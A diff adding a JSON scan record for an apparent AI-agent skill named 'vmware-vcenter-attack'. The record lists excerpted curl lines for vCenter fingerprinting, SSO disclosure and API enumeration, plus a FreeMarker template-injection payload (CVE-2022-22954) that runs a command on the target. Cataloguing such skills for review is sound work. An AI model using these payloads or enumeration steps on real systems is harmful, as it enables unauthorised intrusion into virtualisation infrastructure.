@@ -1,0 +1,324 @@
+{
+  "id": "elementalsouls__claude-bughunter__skills~vmware-vcenter-attack",
+  "owner": "elementalsouls",
+  "repo": "Claude-BugHunter",
+  "path": "skills/vmware-vcenter-attack",
+  "name": "vmware-vcenter-attack",
+  "description": "VMware vSphere / vCenter Server external attack matrix — version fingerprinting, the high-impact CVE chain (CVE-2021-21972 vRealize unauth file upload, CVE-2021-21985 vSAN plugin RCE, CVE-2022-22954 Workspace ONE SSTI, CVE-2023-20887 Aria RCE, CVE-2024-37085 ESXi AD bypass, CVE-2023-34048 vCenter DCERPC OOB write APT-exploited), default credentials, SSO configuration disclosure, vmdir LDAP enumeration, ESXi Open SLP RCE history. ONLY for vCenter / Workspace ONE / Aria instances exposed to the internet — internal-network vCenter is out of scope per the external-only boundary. Use when recon shows port 443 with vCenter banner, `/ui` redirect, `/websso/SAML2/Metadata`, or VMware product fingerprints.",
+  "stars": 5465,
+  "category": "security",
+  "commit": "3e71af03d48b7bca94a815cfff97431f932748d0",
+  "contentHash": "2736db79e98de6b16eafab6ae08f7fc253e61960fecb3c32c10260806eb03cd9",
+  "repoCreatedAt": "2026-05-05T11:22:32Z",
+  "alsoFoundIn": [],
+  "status": "ok",
+  "incomplete": false,
+  "scannedAt": "2026-11-06T19:07:48.007Z",
+  "scan": {
+    "findings": [
+      {
+        "ruleId": "shell",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 27,
+        "excerpt": "TARGET=\"vcenter.target.com\"",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 30,
+        "excerpt": "curl -sk \"https://$TARGET/sdk/vimServiceVersions.xml\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 33,
+        "excerpt": "curl -sk \"https://$TARGET/ui/login\" | grep -oE 'build[^\"]{0,40}'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 34,
+        "excerpt": "curl -sk \"https://$TARGET/ui/\" | grep -oE 'vsphere[^\"]{0,40}'",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 37,
+        "excerpt": "curl -sk \"https://$TARGET/api/appliance/system/version\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 43,
+        "excerpt": "curl -sk \"https://$TARGET/sso-adminserver/sdk/vsphere.local\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 44,
+        "excerpt": "curl -sk \"https://$TARGET/websso/SAML2/Metadata/vsphere.local\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 74,
+        "excerpt": "# Detection only — DO NOT execute the file upload without explicit scope OK",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 75,
+        "excerpt": "curl -sk -o /dev/null -w \"%{http_code}\\n\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 81,
+        "excerpt": "curl -sk -o /dev/null -w \"%{http_code}\\n\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 92,
+        "excerpt": "# Stage A — detection only: reachability + baseline. No command execution yet.",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 93,
+        "excerpt": "curl -sk -o /tmp/wone_baseline.txt -w \"%{http_code}\\n\" \\",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": []
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 101,
+        "excerpt": "curl -sk \"https://$TARGET/catalog-portal/ui/oauth/verify?error=&deviceUdid=\\${\\\"freemarker.template.utility.Execution\\\"?new()(\\\"echo ${CANARY}; id\\\")}\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 128,
+        "excerpt": "# SSO Admin endpoint (frequently exposes domain info)",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 129,
+        "excerpt": "curl -sk \"https://$TARGET/websso/SAML2/Metadata/vsphere.local\" | xmllint --format -",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 132,
+        "excerpt": "curl -sk \"https://$TARGET/sso-adminserver/sdk/vsphere.local\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 144,
+        "excerpt": "curl -skI \"https://$TARGET/mob\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 144,
+        "excerpt": "curl -skI \"https://$TARGET/mob\"",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 149,
+        "excerpt": "curl -sk -u 'administrator@vsphere.local:<pw>' \"https://$TARGET/mob/?moid=ServiceInstance&doPath=content\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 157,
+        "excerpt": "# Get session token",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 158,
+        "excerpt": "curl -sk -X POST -u 'user@vsphere.local:<pw>' \"https://$TARGET/api/session\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 162,
+        "excerpt": "curl -sk -H \"vmware-api-session-id: <token>\" \"https://$TARGET/api/vcenter/vm\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 165,
+        "excerpt": "curl -sk -H \"vmware-api-session-id: <token>\" \"https://$TARGET/api/vcenter/host\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 168,
+        "excerpt": "curl -sk -H \"vmware-api-session-id: <token>\" \"https://$TARGET/api/vcenter/datastore\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 172,
+        "excerpt": "curl -sk -H \"vmware-api-session-id: <token>\" \"https://$TARGET/folder?dsName=datastore1&dcPath=Datacenter\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 180,
+        "excerpt": "# Metadata",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "network",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 181,
+        "excerpt": "curl -sk \"https://$TARGET/SAAS/auth/saml/response\"",
+        "disclosed": true,
+        "automatic": false,
+        "hosts": [
+          "$target"
+        ]
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 195,
+        "excerpt": "# vRealize Operations Manager",
+        "disclosed": true,
+        "automatic": false
+      },
+      {
+        "ruleId": "shell",
+        "file": "skills/vmware-vcenter-attack/SKILL.md",
+        "line": 321,
+        "excerpt": "- **Attack flow:** Two-issue chain — (a) reach the Apache Thrift endpoint exposed on the management interface despite no authentication, (b) inject shell metach",
+        "disclosed": true,
+        "automatic": false
+      }
+    ],
+    "findingTotals": {
+      "shell": 9,
+      "network": 30
+    },
+    "score": 94,
+    "band": "low",
+    "rulesVersion": "1.0.0",
+    "filesScanned": 2,
+    "filesSkipped": 0
+  },
+  "history": [
+    {
+      "commit": "3e71af03d48b7bca94a815cfff97431f932748d0",
+      "scannedAt": "2026-11-06T19:07:48.007Z",
+      "score": 94,
+      "rulesVersion": "1.0.0"
+    }
+  ]
+}
